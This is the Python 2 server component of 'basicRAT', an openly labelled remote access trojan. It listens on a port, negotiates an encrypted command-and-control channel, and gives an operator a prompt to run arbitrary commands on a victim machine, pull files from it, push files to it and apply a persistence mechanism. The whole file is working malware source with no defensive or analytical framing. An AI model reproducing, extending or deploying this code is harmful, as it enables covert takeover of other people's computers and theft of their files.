#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT server
# https://github.com/vesche/basicRAT
#

import argparse
import readline
import socket
import struct
import sys
import time

from core import common


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
download <file> - Download a file.
help            - Show this help menu.
persistence     - Apply persistence mechanism.
rekey           - Regenerate crypto key.
run <command>   - Execute a command on the target.
upload <file>   - Upload a file.
quit            - Gracefully kill client and server.
'''


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-c', '--crypto',
                        help='C2 crypto to use.',
                        default='AES', type=str)
    parser.add_argument('-p', '--port',
                        help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    crypto  = args['crypto']

    if crypto == 'AES':
        from core.crypto import diffiehellman
        from core.crypto import AES_encrypt as encrypt
        from core.crypto import AES_decrypt as decrypt

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('0.0.0.0', port))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(port)
        sys.exit(1)

    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    print 'basicRAT server listening on port {}...\n'.format(port)

    s.listen(10)
    conn, addr = s.accept()
    
    DHKEY = diffiehellman(conn, server=True)
    # debug: confirm DHKEY matches
    # print binascii.hexlify(DHKEY)
    
    while True:
        prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # display help text
        if cmd == 'help':
            print HELP_TEXT
            continue

        # send data to client
        conn.send(encrypt(prompt, DHKEY))

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # results of command
        elif cmd == 'run':
            recv_data = conn.recv(4096)
            print decrypt(recv_data, DHKEY)

        # download a file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                
                with open(fname, 'wb') as f:
                    datasize = struct.unpack("!I", conn.recv(4))[0]
                    while datasize:
                        res = conn.recv(datasize)
                        f.write(decrypt(res, DHKEY))
                        datasize = struct.unpack("!I", conn.recv(4))[0]
                        
        # regenerate DH key (dangerous! may cause connection loss!)
        # available in case a fallback occurs or you suspect eavesdropping
        elif cmd == 'rekey':
            DHKEY = diffiehellman(conn, server=True)
            
        # results of persistence
        elif cmd == 'persistence':
            print 'Applying persistence mechanism...'
            recv_data = conn.recv(1024)
            print decrypt(recv_data, DHKEY)

        else:
            print 'Invalid command, type "help" to see a list of commands.'


if __name__ == '__main__':
    main()
